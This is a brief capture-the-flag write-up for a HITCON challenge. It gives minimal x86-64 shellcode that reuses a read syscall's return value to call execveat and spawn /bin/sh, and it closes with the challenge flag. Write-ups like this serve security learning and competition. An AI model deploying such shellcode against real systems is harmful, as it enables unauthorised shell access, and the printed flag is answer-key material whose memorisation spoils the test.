# Re: Easy to say
## Misc 255
## 30 solved

* disasm('\x75\xfa')
```asm
jne    0xfffffffffffffffc
```
* payload:
```asm
push rsp
pop rsi
xor edx,esp
syscall
jne    0xfffffffffffffffc
```
* First time read the `/bin/sh\x00` with padding to let length of it become 322 to the stack.
* After `jne` it continue at `xor edx,esp` with `rax = 322` , `rdx = 0` , `rsi = /bin/sh`.
* Syscall again -> execveat( 0 , "/bin/sh" , 0 , 0 ).
* hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3}